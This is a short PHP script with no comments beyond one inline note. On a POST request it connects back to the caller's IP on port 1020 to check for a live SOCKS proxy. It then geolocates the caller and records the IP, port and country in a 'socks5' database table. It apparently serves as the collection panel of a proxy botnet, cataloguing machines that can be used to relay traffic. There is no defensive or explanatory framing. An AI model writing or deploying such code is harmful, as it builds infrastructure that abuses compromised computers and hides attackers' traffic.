<?php
include("funcs.php");
include('config.php');
if (isset($_POST['mode']))
{
    if ($_POST['mode'] == 1) {
        $server  = $_SERVER['REMOTE_ADDR'];
        $port   = "1020";
        $timeout = "5";
        $connectsock =  @fsockopen("$server", $port, $errno, $errstr, $timeout);
        if(!$connectsock) 
        {
            echo "ERR";
            die("");
        }
        /**Connected sucessfullly
                     $server is the IP of the working socks4, write it to Database or file
                     **/
					 
include("geoip.inc");
$gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);
$country = geoip_country_name_by_addr($gi,$_SERVER['REMOTE_ADDR']);
geoip_close($gi);
echo $country;



mysql_query("INSERT INTO socks5 (ip, port, contry)
VALUES ('$server', '$port', '$country')");
mysql_close();
    }
}		
die("");
?>